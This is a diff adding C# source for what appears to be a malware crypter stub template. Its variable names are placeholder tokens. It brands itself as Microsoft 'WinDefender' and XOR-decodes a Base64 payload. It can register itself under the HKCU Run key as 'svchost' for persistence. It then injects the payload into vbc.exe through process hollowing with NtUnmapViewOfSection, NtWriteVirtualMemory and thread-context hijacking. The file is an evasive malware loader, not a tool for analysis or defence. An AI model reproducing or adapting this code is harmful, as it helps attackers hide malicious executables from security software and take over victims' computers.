@@ -1,0 +1,203 @@
+
+using System;
+using System.Collections;
+using System.Collections.Generic;
+using Microsoft.Win32;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.IO;
+using System.Text;
+using System.Windows.Forms;
+using System.Reflection;
+using System.Runtime.CompilerServices;
+
+[assembly: AssemblyTitle("Product")]
+[assembly: AssemblyDescription("")]
+[assembly: AssemblyConfiguration("")]
+[assembly: AssemblyCompany("WinDefender")]
+[assembly: AssemblyProduct("WinDefender")]
+[assembly: AssemblyCopyright("Copyright © Microsoft Corporation")]
+[assembly: AssemblyTrademark("")]
+[assembly: AssemblyCulture("")]
+[assembly: Guid("0f52f99a-a13c-4991-8db9-447ad43f7b02")]
+[assembly: AssemblyVersion("1.0.0.0")]
+[assembly: AssemblyFileVersion("1.0.0.0")]
+namespace zazzo
+{
+static class adwadw
+{
+ 
+    public static void Main()
+    {
+
+	    string startz = "startoff";
+	    string %10% = "msgoff";
+       byte[] %4% = %01%(Convert.FromBase64String(%3%), "lolil");
+		string %64% = Environment.GetEnvironmentVariable("windir") + @"\Microsoft.Net\Framework\v2.0.50727\vbc.exe";
+
+		if (startz == "starton") 
+				{
+				  Microsoft.Win32.RegistryKey Registry = Microsoft.Win32.Registry.CurrentUser;
+				Microsoft.Win32.RegistryKey Key = Registry.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+				Key.SetValue("svchost", Application.ExecutablePath, Microsoft.Win32.RegistryValueKind.String);
+				}
+		if (%10% == "msgon")
+		{
+		System.Windows.Forms.MessageBox.Show("msghere","titlehere");
+		}
+
+
+      cMemoryExecute.Run(%4%, %64%, "");
+
+   
+
+}
+
+
+   public static byte[] %01%(byte[] message, string password)
+    {
+        byte[] passarr = System.Text.Encoding.UTF8.GetBytes(password);
+        int rand1 = System.Convert.ToInt32(message[message.Length - 1] ^ 112);
+        byte[] outarr = new byte[message.Length + 1];
+        int u1 = System.Convert.ToInt32(0);
+        for (int i1 = 0; i1 <= message.Length - 1; i1++)
+        {
+            outarr[i1] = (byte)((message[i1] ^ rand1) ^ passarr[u1]);
+            if (u1 == password.Length - 1)
+            {
+                u1 = 0;
+            }
+            else
+            {
+                u1++;
+            }
+        }
+        Array.Resize(ref outarr, message.Length - 2 + 1);
+        return outarr;
+    }
+
+
+}
+
+}
+
+public static unsafe class cMemoryExecute
+{
+    /// <summary>
+    /// Runs an EXE (which is loaded in a byte array) in memory.
+    /// </summary>
+    /// <param name="exeBuffer">The EXE buffer.</param>
+    /// <param name="hostProcess">Full path of the host process to run the buffer in.</param>
+    /// <param name="optionalArguments">Optional command line arguments.</param>
+    /// <returns></returns>
+    public static bool Run(byte[] exeBuffer, string hostProcess, string optionalArguments)
+    {
+        var IMAGE_SECTION_HEADER = new byte[0x28]; // pish
+        var IMAGE_NT_HEADERS = new byte[0xf8]; // pinh
+        var IMAGE_DOS_HEADER = new byte[0x40]; // pidh
+        var PROCESS_INFO = new int[0x4]; // pi
+        var CONTEXT = new byte[0x2cc]; // ctx
+
+        byte* pish;
+        fixed (byte* p = &IMAGE_SECTION_HEADER[0])
+            pish = p;
+
+        byte* pinh;
+        fixed (byte* p = &IMAGE_NT_HEADERS[0])
+            pinh = p;
+
+        byte* pidh;
+        fixed (byte* p = &IMAGE_DOS_HEADER[0])
+            pidh = p;
+
+        byte* ctx;
+        fixed (byte* p = &CONTEXT[0])
+            ctx = p;
+
+        // Set the flag.
+        *(uint*)(ctx + 0x0 /* ContextFlags */) = CONTEXT_FULL;
+
+        // Get the DOS header of the EXE.
+        Buffer.BlockCopy(exeBuffer, 0, IMAGE_DOS_HEADER, 0, IMAGE_DOS_HEADER.Length);
+
+        /* Sanity check:  See if we have MZ header. */
+        if (*(ushort*)(pidh + 0x0 /* e_magic */) != IMAGE_DOS_SIGNATURE)
+            return false;
+
+        var e_lfanew = *(int*)(pidh + 0x3c);
+
+        // Get the NT header of the EXE.
+        Buffer.BlockCopy(exeBuffer, e_lfanew, IMAGE_NT_HEADERS, 0, IMAGE_NT_HEADERS.Length);
+
+        /* Sanity check: See if we have PE00 header. */
+        if (*(uint*)(pinh + 0x0 /* Signature */) != IMAGE_NT_SIGNATURE)
+            return false;
+
+        // Run with parameters if necessary.
+        if (!string.IsNullOrEmpty(optionalArguments))
+            hostProcess += " " + optionalArguments;
+
+        if (!CreateProcess(null, hostProcess, IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED, IntPtr.Zero, null, new byte[0x44], PROCESS_INFO))
+            return false;
+
+        var ImageBase = new IntPtr(*(int*)(pinh + 0x34));
+        NtUnmapViewOfSection((IntPtr)PROCESS_INFO[0] /* pi.hProcess */, ImageBase);
+        if (VirtualAllocEx((IntPtr)PROCESS_INFO[0] /* pi.hProcess */, ImageBase, *(uint*)(pinh + 0x50 /* SizeOfImage */), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE) == IntPtr.Zero)
+            Run(exeBuffer, hostProcess, optionalArguments); // Memory allocation failed; try again (this can happen in low memory situations)
+
+        fixed (byte* p = &exeBuffer[0])
+            NtWriteVirtualMemory((IntPtr)PROCESS_INFO[0] /* pi.hProcess */, ImageBase, (IntPtr)p, *(uint*)(pinh + 84 /* SizeOfHeaders */), IntPtr.Zero);
+
+        for (ushort i = 0; i < *(ushort*)(pinh + 0x6 /* NumberOfSections */); i++)
+        {
+            Buffer.BlockCopy(exeBuffer, e_lfanew + IMAGE_NT_HEADERS.Length + (IMAGE_SECTION_HEADER.Length * i), IMAGE_SECTION_HEADER, 0, IMAGE_SECTION_HEADER.Length);
+            fixed (byte* p = &exeBuffer[*(uint*)(pish + 0x14 /* PointerToRawData */)])
+                NtWriteVirtualMemory((IntPtr)PROCESS_INFO[0] /* pi.hProcess */, (IntPtr)((int)ImageBase + *(uint*)(pish + 0xc /* VirtualAddress */)), (IntPtr)p, *(uint*)(pish + 0x10 /* SizeOfRawData */), IntPtr.Zero);
+        }
+
+        NtGetContextThread((IntPtr)PROCESS_INFO[1] /* pi.hThread */, (IntPtr)ctx);
+        NtWriteVirtualMemory((IntPtr)PROCESS_INFO[0] /* pi.hProcess */, (IntPtr)(*(uint*)(ctx + 0xAC /* ecx */)), ImageBase, 0x4, IntPtr.Zero);
+        *(uint*)(ctx + 0xB0 /* eax */) = (uint)ImageBase + *(uint*)(pinh + 0x28 /* AddressOfEntryPoint */);
+        NtSetContextThread((IntPtr)PROCESS_INFO[1] /* pi.hThread */, (IntPtr)ctx);
+        NtResumeThread((IntPtr)PROCESS_INFO[1] /* pi.hThread */, IntPtr.Zero);
+
+        return true;
+    }
+
+    #region WinNT Definitions
+
+    private const uint CONTEXT_FULL = 0x10007;
+    private const int CREATE_SUSPENDED = 0x4;
+    private const int MEM_COMMIT = 0x1000;
+    private const int MEM_RESERVE = 0x2000;
+    private const int PAGE_EXECUTE_READWRITE = 0x40;
+    private const ushort IMAGE_DOS_SIGNATURE = 0x5A4D; // MZ
+    private const uint IMAGE_NT_SIGNATURE = 0x00004550; // PE00
+
+    #region WinAPI
+    [DllImport("kernel32.dll", SetLastError = true)]
+    private static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, byte[] lpStartupInfo, int[] lpProcessInfo);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    private static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+    [DllImport("ntdll.dll", SetLastError = true)]
+    private static extern uint NtUnmapViewOfSection(IntPtr hProcess, IntPtr lpBaseAddress);
+
+    [DllImport("ntdll.dll", SetLastError = true)]
+    private static extern int NtWriteVirtualMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, uint nSize, IntPtr lpNumberOfBytesWritten);
+
+    [DllImport("ntdll.dll", SetLastError = true)]
+    private static extern int NtGetContextThread(IntPtr hThread, IntPtr lpContext);
+
+    [DllImport("ntdll.dll", SetLastError = true)]
+    private static extern int NtSetContextThread(IntPtr hThread, IntPtr lpContext);
+
+    [DllImport("ntdll.dll", SetLastError = true)]
+    private static extern uint NtResumeThread(IntPtr hThread, IntPtr SuspendCount);
+    #endregion
+
+    #endregion
+}
+
+	
